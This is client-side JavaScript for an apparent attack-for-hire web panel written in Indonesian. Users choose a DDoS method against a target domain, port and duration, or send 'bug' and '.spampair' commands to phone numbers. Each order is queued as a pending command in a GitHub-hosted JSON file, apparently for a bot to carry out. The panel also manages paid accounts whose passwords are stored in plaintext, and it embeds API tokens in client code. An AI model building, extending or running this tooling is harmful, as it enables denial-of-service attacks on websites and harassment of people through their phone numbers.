//===========[ API GITHUB ]=================//

const API_LOGIN = 'https://api.github.com/repos/YassProjectt/APK-BUG/contents/db.json';
const TOKEN_LOGIN = 'TEMPEL TOKEN LU';

const API_BUGS   = 'https://api.github.com/repos/NAMA-GITHUB-LU/NAMA-REPOSITORI-LU/contents/sender.json'; 
const TOKEN_BUGS = 'TEMPEL TOKEN LU';

const API_ACTIVITY = 'https://api.github.com/repos/NAMA-GITHUB-LU/NAMA-REPOSITORI-LU/contents/Activity.json';
const TOKEN_ACTIVITY = 'TEMPEL TOKEN LU'

//====================================//

const roleBtn = document.getElementById("roleBtn");
const roleList = document.getElementById("roleList");
const newRole = document.getElementById("newRole");

roleBtn.onclick = () => roleList.classList.toggle("hidden");

roleList.querySelectorAll("li").forEach(li => {
  li.onclick = () => {
    roleBtn.innerHTML = `<span style="display:flex;align-items:center;gap:8px;justify-content:center;width:100%">${li.innerHTML}</span> ▾`;
    newRole.value = li.dataset.value;
    roleList.classList.add("hidden");
  };
});

function ddos_isSimTarget(target){
  if(!target) return false;
  const t = target.trim();

  if(/\s/.test(t)) return false;
  if(/^(https?:\/\/)/i.test(t)) return false;

  
  const isIPv4 = /^(\d{1,3}\.){3}\d{1,3}$/.test(t);
  const isIPv6 = /:/.test(t) && /^[0-9a-fA-F:]+$/.test(t);
  if(isIPv4 || isIPv6) return false;

  if(/^[a-z0-9\-]+\.[a-z0-9\-\.]+$/i.test(t)) return true;

  if(/^SIM:|^sim-/i.test(t)) return true;

  return false;
}

async function ddos_sendCommandToGithub(command, target) {
  if(!ddos_isSimTarget(target)) throw new Error('Target tidak valid — gunakan nama domain (example.com) atau prefix SIM: untuk simulasi.');

  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    throw new Error('Helper githubGet/githubPut tidak ditemukan di halaman.');
  }

  const { content: oldContent, sha } = await githubGet(API_BUGS, TOKEN_BUGS);
  const base = (oldContent && oldContent.data) ? oldContent : { server: "Active", data: [] };

  const entry = {
    command: command,
    status: "pending"
  };

  base.data.push(entry);

  await githubPut(API_BUGS, TOKEN_BUGS, base, `log: ${command}`, sha);
  return entry;
}

async function ddos_incrementActivity(delta = 1){
  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    console.warn('github helpers not found for activity increment');
    return null;
  }
  const res = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
  const data = res.content || { Activitas: 0 };
  data.Activitas = (parseInt(data.Activitas, 10) || 0) + delta;
  await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, data, `activity +${delta}`, res.sha);

  // update UI elements if present
  const el = document.getElementById('ddosActivityCount');
  if(el) el.textContent = data.Activitas;
  const globalEl = document.getElementById('activityCount');
  if(globalEl) globalEl.textContent = data.Activitas;

  return data.Activitas;
}

(function(){
  const cards = document.querySelectorAll('#ddosMethodGrid .ddos-card');
  let chosenCmd = null;
  cards.forEach(c => {
    c.addEventListener('click', () => {
      cards.forEach(x => x.classList.remove('selected'));
      c.classList.add('selected');
      chosenCmd = c.dataset.cmd; 
    });
  });

  const btn = document.getElementById('sendDdosBtn');
  const msgEl = document.getElementById('ddosMsg');
  const targetInput = document.getElementById('ddosTargetInput');
  const portInput = document.getElementById('ddosPortInput');
  const durInput = document.getElementById('ddosDurationInput');
  const serverEl = document.getElementById('ddosServerStatus');

  btn.addEventListener('click', async () => {
    try {
      if(!chosenCmd) throw new Error('Pilih type DDoS dulu.');
      const rawTarget = (targetInput.value || '').trim();
      if(!rawTarget) throw new Error('Isi target.');

      const durRaw = (durInput.value || '').trim();
      const portRaw = (portInput.value || '').trim();
      const dur = durRaw === '' ? 'auto' : (durRaw.replace(/\D/g,'') || 'auto');
      const port = portRaw === '' ? 'auto' : (portRaw.replace(/\D/g,'') || 'auto');

      const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;
      
const link = /^(https?:\/\/)/i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
      await ddos_sendCommandToGithub(cmd, rawTarget);

      await ddos_incrementActivity(1);

      if (msgEl) { 
  msgEl.textContent = "Berhasil Mengirim Spam P"; 
  msgEl.style.color = "var(--success)"; 
}

      setTimeout(()=>{ if(serverEl) serverEl.textContent = 'OFF'; }, 2000);

    } catch(err) {
      msgEl.textContent = err.message || 'Gagal mengirim';
      msgEl.style.color = 'var(--danger)';
      if(typeof showPopupNotif === 'function') showPopupNotif(err.message || 'Gagal', false);
    }
  });
})();

async function loadServerAndActivity() {
  try {
    const res = await fetch(API_ACTIVITY, {
      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
    });
    if (!res.ok) throw new Error("Gagal fetch data: " + res.status);

    const data = await res.json();
    const decoded = atob(data.content);
    const json = JSON.parse(decoded);

    console.log("Data dari GitHub:", json);
    
    const active = json?.Servers?.Active === true;
    document.querySelectorAll('[id^="serverStatus"]').forEach(el => {
      el.textContent = active ? "ON" : "OFF";
      el.style.color = active ? "var(--success)" : "var(--danger)";
    });

    const count = json?.Activitas ?? 0;
    document.querySelectorAll('[id^="activityCount"]').forEach(el => {
      el.textContent = count;
      el.style.color = "var(--text)";
    });

    if (json?.Servers?.Message) {
      console.log("Server Message:", json.Servers.Message);
    }

  } catch (err) {
    console.error("Gagal memuat dari GitHub:", err);  
    document.querySelectorAll('[id^="serverStatus"]').forEach(el => {
      el.textContent = "OFF";
      el.style.color = "var(--danger)";
    });
  }
}

document.addEventListener("DOMContentLoaded", loadServerAndActivity);

let selectedBug = null;

document.querySelectorAll('.bug-card').forEach(card=>{
  card.addEventListener('click', ()=>{
    document.querySelectorAll('.bug-card').forEach(c=> c.classList.remove('selected'));
    card.classList.add('selected');
    selectedBug = card.dataset.cmd;
  });
});

document.getElementById('sendBugBtn').addEventListener('click', async()=>{
  const num = document.getElementById('bugNumber').value.trim();
  const msg = document.getElementById('bugMsg');

  if(!num){ msg.textContent="Nomor wajib diisi!"; msg.style.color="var(--danger)"; return; }
  if(!selectedBug){ msg.textContent="Pilih type bug terlebih dahulu!"; msg.style.color="var(--danger)"; return; }

  const command = `${selectedBug} ${num}`;

  try {
    const {content, sha} = await githubGet(API_BUGS, TOKEN_BUGS);
    let bugs = content || { server: "Active", data: [] };

    bugs.data.push({
      command: command,
      status: "pending"
    });

    await githubPut(API_BUGS, TOKEN_BUGS, bugs, `send bug ${command}`, sha);

    const act = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
    let actData = act.content || { Activitas: 0 };
    actData.Activitas = (parseInt(actData.Activitas) || 0) + 1;
    await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, actData, "update activity", act.sha);

    loadActivity();

    showPopupNotif(`Bug berhasil dikirim ke ${num}`);

  } catch(err){
    msg.textContent = "Gagal kirim bug"
    msg.style.color = "var(--danger)";
  }
});

    let state = {
      user:null, role:null,
      loginSha:null, loginList:[],
      numbersSha:null, numbers:[],
    }

    async function githubGet(url, token){
      const res = await fetch(url, {headers:{Authorization:`token ${token}`, Accept:'application/vnd.github+json'}});
      if(res.status === 404){
        return {content:null, sha:null, notFound:true}
      }
      if(!res.ok){ throw new Error('failed: '+res.status) }
      const data = await res.json();
      const decoded = data.content ? JSON.parse(atob(data.content)) : null;
      return {content:decoded, sha:data.sha}
    }

    async function githubPut(url, token, jsonContent, message, sha){
      const body = {
        message,
        content: btoa(JSON.stringify(jsonContent, null, 2)),
        sha: sha || undefined
      }
      const res = await fetch(url, {
        method:'PUT',
        headers:{'Content-Type':'application/json', Authorization:`token ${token}`, Accept:'application/vnd.github+json'},
        body: JSON.stringify(body)
      });
      if(!res.ok){
        const t = await res.text();
        throw new Error('GitHub PUT failed: '+res.status+' '+t)
      }
      return await res.json();
    }

    function toast(el, msg, ok=true){ el.textContent = msg; el.style.color = ok? 'var(--success)':'var(--danger)'; }

    function setView(id){
  
  document.querySelectorAll('main[id^="view-"]').forEach(m => {
    m.classList.add('hidden');
    m.classList.remove('visible'); 
  });

  const target = document.getElementById('view-'+id);
  if(target){
    target.classList.remove('hidden');
    setTimeout(()=> target.classList.add('visible'), 50);
  }

  document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
  const link = document.querySelector(`.menu a[data-view="${id}"]`);
  if(link) link.classList.add('active');

  drawer.classList.remove('open');
  window.scrollTo({top:0, behavior:'smooth'});
}

function showBugSuccess(msg) {
  const bugMsg = document.getElementById("bugMsg");
  bugMsg.textContent = msg;
  bugMsg.style.color = "lime";

  const bugCard = bugMsg.closest(".card");
  bugCard.classList.remove("success-anim"); 
  void bugCard.offsetWidth;                 
  bugCard.classList.add("success-anim");
}
    
    function parseExpired(input){
  const now = new Date();
  if(!input) return null;

  const trimmed = input.trim().toLowerCase();

  if(/^\d+$/.test(trimmed)){
    now.setDate(now.getDate() + parseInt(trimmed));
    return now.toISOString();
  }

  const m = trimmed.match(/(\d+)\s*(hari|jam|h|j)/i);
  if(!m) return null;

  const val = parseInt(m[1]);
  const unit = m[2];

  if(unit.startsWith('h')) now.setDate(now.getDate() + val);   
  else if(unit.startsWith('j')) now.setHours(now.getHours() + val); 

  return now.toISOString();
}

    async function loadLogins(){
  const {content, sha} = await githubGet(API_LOGIN, TOKEN_LOGIN);

  if(Array.isArray(content)){
    state.loginList = content;
  } else if(content && typeof content === "object"){
    state.loginList = [content];
  } else {
    state.loginList = [];
  }

  state.loginSha = sha;
}

async function deleteAccount(username){
  try {
    state.loginList = state.loginList.filter(acc => acc.username !== username);

    await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete user ${username}`, state.loginSha);

    await loadLogins();
    renderAccounts();

    toast(accMsg, `Akun "${username}" berhasil dihapus`, true);
  } catch(e){
    toast(accMsg, `Gagal hapus akun`, false);
  }
}

    async function doLogin(username, password){
  await loadLogins();
  const found = state.loginList.find(u => u.username === username && u.password === password);
  if(!found) return null;

  if(found.expired){
    const expDate = new Date(found.expired).getTime();
    if(Date.now() > expDate){
      
      state.loginList = state.loginList.filter(x=>x.username !== username);
      await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete expired user ${username}`, state.loginSha);
      throw new Error("Akun sudah kedaluwarsa dan dihapus");
    }
  }

  state.user = username; 
  state.role = found.role;
  sessionStorage.setItem('session', JSON.stringify({u:username, r:found.role}));
  return found;
}

    function restoreSession(){
  const s = sessionStorage.getItem('session');
  if(!s){
    setView('login'); 
    return;
  }

  const {u, r} = JSON.parse(s);
  state.user = u; 
  state.role = r;

  document.getElementById('who').textContent = u + ' • ' + r;
  document.getElementById('userBadge').classList.remove('hidden');
  document.getElementById('roleChip').textContent = r;
  if(r==='admin') document.getElementById('adminSection').classList.remove('hidden');
  document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');

    showBottomNav();

  showBottomNav(); 
  setView('dashboard');
        startNotifCycle();
  loadNumbers();
}

    function logout(){
      sessionStorage.removeItem('session'); location.reload();
    }

function setActiveBottomNav(view){
  const items = document.querySelectorAll('#bottomNav a[data-view]');
  items.forEach(a => {
    if(a.dataset.view === view) a.classList.add('active');
    else a.classList.remove('active');
  });
}

function showBottomNav(){
  const bottomNav = document.getElementById('bottomNav');
  if(!bottomNav) return;

  bottomNav.classList.remove('hidden');
  void bottomNav.offsetWidth;
  bottomNav.classList.add('show');
  setActiveBottomNav('dashboard');

  bottomNav.querySelectorAll('a[data-view]').forEach(a=>{
    a.onclick = (e)=>{
      e.preventDefault();
      const v = a.dataset.view;
      setView(v);
      setActiveBottomNav(v);

      if(v==='numbers'){ loadNumbers(); }
      if(v==='accounts'){ 
  if(state.role === 'admin'){
    loadLogins(); 
    renderAccounts(); 
  } else {
    setView('accounts-blocked');
  }
}
    };
  });
}

let slideIndex = 0;
let slidesBox;

function showSlidesBox() {
  slidesBox.forEach((el) => el.classList.remove("active", "prev"));

  const prevIndex = slideIndex;
  slideIndex = (slideIndex + 1) % slidesBox.length;

  slidesBox[prevIndex].classList.add("prev");
  slidesBox[slideIndex].classList.add("active");

  setTimeout(showSlidesBox, 2000); 
}

document.addEventListener("DOMContentLoaded", () => {
  slidesBox = document.querySelectorAll(".slideshow-box .slide-box");
  if (slidesBox.length > 0) {
    slidesBox[0].classList.add("active");
    setTimeout(showSlidesBox, 4000);
  }
});

document.querySelectorAll('#bottomNav a[data-view]').forEach(a=>{
  a.addEventListener('click', e=>{
    e.preventDefault();
    const v = a.dataset.view;
    setView(v);
    setActiveBottomNav(v);
  });
});

const _origSetView = setView;
setView = function(id){
  _origSetView(id);

  const bn = document.getElementById('bottomNav');
  if(bn && bn.classList.contains('show')) setActiveBottomNav(id);
}

    function renderAccounts(){
  const body = document.getElementById('accountsTable');
  body.innerHTML = '';

  state.loginList.forEach((acc, i) => {
    let expiredText = "Tidak ada";

    if(acc.expired){
      const expDate = new Date(acc.expired).getTime();
      const now = Date.now();
      const diff = expDate - now;
      const daysLeft = Math.ceil(diff / (1000*60*60*24));

      if(daysLeft > 0){
        expiredText = `${daysLeft} hari lagi`;
      } else {
        expiredText = `Lewat ${Math.abs(daysLeft)} hari`;
      }
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i+1}</td>
      <td>${acc.username}</td>
      <td>${acc.role}</td>
      <td>${expiredText}</td>
      <td>
        <button class="btn small danger" onclick="deleteAccount('${acc.username}')">Hapus</button>
      </td>
    `;
    body.appendChild(tr);
  });
}

    async function createAccount(u,p,r,expInput){
  if(!u||!p) throw new Error('Username & password wajib');
  if(state.loginList.some(x=>x.username===u)) throw new Error('Username sudah ada');

  const expDate = parseExpired(expInput);

  if(!Array.isArray(state.loginList)) state.loginList = [];

  state.loginList.push({
    username: u,
    password: p,
    role: r,
    expired: expDate || null
  });

  await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `create user ${u}`, state.loginSha);
  await loadLogins();
  renderAccounts();
}

    const formLogin = document.getElementById('formLogin');
    const loginMsg = document.getElementById('loginMsg');
    const numMsg   = document.getElementById('numMsg');
    const accMsg   = document.getElementById('accMsg');
    const drawer   = document.getElementById('drawer');

    document.getElementById('btnHamburger').onclick = ()=> drawer.classList.toggle('open');

    document.querySelectorAll('.menu a[data-view]').forEach(a=>{
      a.addEventListener('click', async (e)=>{
        e.preventDefault(); const v = a.dataset.view; setView(v);
        if(v==='numbers'){ await loadNumbers(); }
        if(v==='accounts'){ await loadLogins(); renderAccounts(); }
      })
    })

    formLogin.addEventListener('submit', async (e)=>{
      e.preventDefault(); 
      loginMsg.textContent = 'Memeriksa…';
      const u = document.getElementById('username').value.trim();
      const p = document.getElementById('password').value.trim();
      try{
        const ok = await doLogin(u,p);
        if(!ok){ 
          toast(loginMsg, 'Username atau password salah', false); 
          return; 
        }
        toast(loginMsg, 'Berhasil masuk');
        document.getElementById('who').textContent = u + ' • ' + ok.role;
        document.getElementById('userBadge').classList.remove('hidden');
        document.getElementById('roleChip').textContent = ok.role;
        if(ok.role==='admin') document.getElementById('adminSection').classList.remove('hidden');
        document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');

    showBottomNav();
        setView('dashboard');
        await loadNumbers();
      }catch(err){ 
        toast(loginMsg, err.message, false); 
      }
    });

    document.getElementById('btnAddNumber').onclick = async()=>{
      const field = document.getElementById('numberInput');
      try{ await addNumber(field.value.trim()); toast(numMsg,'Nomor ditambahkan'); field.value=''; }
      catch(e){ toast(numMsg, e.message, false) }
    }

    document.getElementById('btnCreate').onclick = async()=>{
  const u   = document.getElementById('newUser').value.trim();
  const p   = document.getElementById('newPass').value.trim();
  const r   = document.getElementById('newRole').value; 
  const exp = document.getElementById('newExpired').value.trim() || null;

  try { 
    await createAccount(u,p,r,exp); 
    toast(accMsg,'Akun dibuat');
    document.getElementById('newUser').value='';
    document.getElementById('newPass').value='';
    document.getElementById('newExpired').value='';
  } catch(e){ 
    toast(accMsg, e.message, false); 
  }
}

    const io = new IntersectionObserver((entries)=>{
      entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible') })
    }, {threshold:.15});
    document.querySelectorAll('.reveal').forEach(el=> io.observe(el));
    
const bugCards = document.querySelectorAll('.bug-card');
const ioBug = new IntersectionObserver((entries)=>{
  entries.forEach(e=>{
    if(e.isIntersecting){
      bugCards.forEach((card, idx)=>{
        setTimeout(()=> card.classList.add('visible'), idx * 200); 
      });
      ioBug.disconnect();
    }
  });
}, {threshold:.2});
if(bugCards.length) ioBug.observe(bugCards[0]);

    restoreSession();

document.addEventListener("DOMContentLoaded", () => {
  const btnProfile = document.getElementById('btnProfile');
  const profileCard = document.getElementById('profileCard');
  const closeProfile = document.getElementById('closeProfile');
  const profileUsername = document.getElementById('profileUsername');
  const profilePassword = document.getElementById('profilePassword');
  const profileExpired = document.getElementById('profileExpired');
  const profileLogout = document.getElementById('profileLogout');

  function daysLeft(exp){
    if(!exp) return "Tidak ada";
    const expDate = new Date(exp).getTime();
    const now = Date.now();
    const diff = expDate - now;
    const days = Math.ceil(diff / (1000*60*60*24));
    return days > 0 ? `${days} hari lagi` : `Expired ${Math.abs(days)} hari lalu`;
  }

  btnProfile.addEventListener("click", async () => {
    await loadLogins();
    const found = state.loginList.find(u => u.username === state.user);
    if(found){
      profileUsername.textContent = found.username;
      profilePassword.textContent = found.password;
      profileExpired.textContent = daysLeft(found.expired);
    }
    profileCard.classList.add('show');
  });

  closeProfile.addEventListener("click", () => {
    profileCard.classList.remove('show');
  });

  profileLogout.addEventListener("click", logout);
});

function showPopupNotif(text, success = true) {
  const popup = document.getElementById("notifPopup");
  const popupText = document.getElementById("notifText");
  const popupIcon = popup.querySelector("i");

  popupText.textContent = text;

  if (success) {
    popupIcon.className = "fa-solid fa-circle-check";
    popupIcon.style.color = "lime";
  } else {
    popupIcon.className = "fa-solid fa-circle-xmark";
    popupIcon.style.color = "red";
  }

  popup.classList.add("show");
  popup.classList.remove("hidden");

  setTimeout(() => {
    popup.classList.remove("show");
    setTimeout(() => popup.classList.add("hidden"), 250);
  }, 3500);
}

async function startNotifCycle() {
  try {
    const res = await fetch("https://raw.githubusercontent.com/DaffaDevv/ACTIVITY/main/activity.json");
    const data = await res.json();

    const allMessages = Object.keys(data.Servers || {})
      .filter(k => k.toLowerCase().startsWith("message"))
      .map(k => data.Servers[k])
      .filter(Boolean);

    let queue = [];

    function shuffleMessages() {
      queue = [...allMessages];
      for (let i = queue.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [queue[i], queue[j]] = [queue[j], queue[i]];
      }
    }

    shuffleMessages();

    const box = document.getElementById("topNotif");
    const nameEl = document.getElementById("notifName");
    const msgEl = document.getElementById("notifMsg");
    const sound = document.getElementById("notifSound");
    const btnClose = document.getElementById("notifClose");

    function showNotif() {
      if (!queue.length) shuffleMessages();

      const msg = queue.shift();
      if (!msg) return;

      nameEl.textContent = "NOTIFICATION";
      msgEl.textContent = msg;
      box.classList.remove("hidden");

      if (sound) {
        sound.currentTime = 0;
        setTimeout(() => {
          sound.play().catch(err => console.warn("Audio blocked:", err));
        }, 200); 
      }

      setTimeout(() => box.classList.add("hidden"), 5000);
    }

    btnClose.onclick = () => {
      box.classList.add("hidden");
    };

    showNotif();
    setInterval(showNotif, 20000); 
  } catch (err) {
    console.error("Notif error:", err);
  }
}
(function(){
  const menuLinks = document.querySelectorAll('.menu a[data-view]');
  if(menuLinks && menuLinks.length){
    menuLinks.forEach(link=>{
      if(link.dataset.hasHandler) return;
      link.dataset.hasHandler = '1';
      link.addEventListener('click', function(e){
        e.preventDefault();
        const view = this.dataset.view; 
        if(typeof setView === 'function'){
          setView(view);
        } else {
          
          document.querySelectorAll('main[id^="view-"]').forEach(m=>{ m.classList.add('hidden'); m.classList.remove('visible'); });
          const target = document.getElementById('view-' + view);
          if(target){ target.classList.remove('hidden'); setTimeout(()=> target.classList.add('visible'), 50); }
        }
        document.querySelectorAll('.menu a').forEach(x=>x.classList.remove('active'));
        this.classList.add('active');
      });
    });
  }
})();

(function(){
  const btn = document.getElementById('sendSpampairBtn');
  if(!btn) return;

  const numInput = document.getElementById('spampairNumberInput');
  const durInput = document.getElementById('spampairDurationInput');
  const msgEl = document.getElementById('spampairMsg');
  const activityEl = document.getElementById('spampairActivity') || document.getElementById('activityCount');
  const serverEl = document.getElementById('spampairServer') || document.getElementById('serverStatus');

  btn.addEventListener('click', async function(){
    try {
      if (msgEl) msgEl.textContent = '';

      const rawNum = (numInput.value || '').trim();
      const rawDur = (durInput.value || '').trim();
      if(!rawNum || !rawDur) throw new Error();

      const num = rawNum.replace(/\D/g,'');
      const dur = rawDur.replace(/\D/g,'');

      const command = `.spampair ${num}|${dur}`;

      if(serverEl) serverEl.textContent = 'ON';
      if(msgEl){ msgEl.textContent = 'Mengirim...'; msgEl.style.color = 'var(--muted)'; }

      const res = await githubGet(API_BUGS, TOKEN_BUGS);
      const base = (res.content && res.content.data) ? res.content : { server: "Active", data: [] };

      base.data.push({ command: command, status: "pending" });
      await githubPut(API_BUGS, TOKEN_BUGS, base, `spampair: ${num}|${dur}`, res.sha);

      if(msgEl){ msgEl.textContent = `Terkirim ke ${num}`; msgEl.style.color = 'var(--success)'; }

      if(activityEl){ 
        const cur = parseInt(activityEl.textContent || '0') || 0; 
        activityEl.textContent = cur + 1; 
      }
      setTimeout(()=>{ if(serverEl) serverEl.textContent = 'OFF'; }, 1400);

    } catch(err) {
      if(msgEl){ msgEl.textContent = "Gagal mengirim"; msgEl.style.color = 'var(--danger)'; }
      if(serverEl) serverEl.textContent = 'OFF';
    }
  });
})();
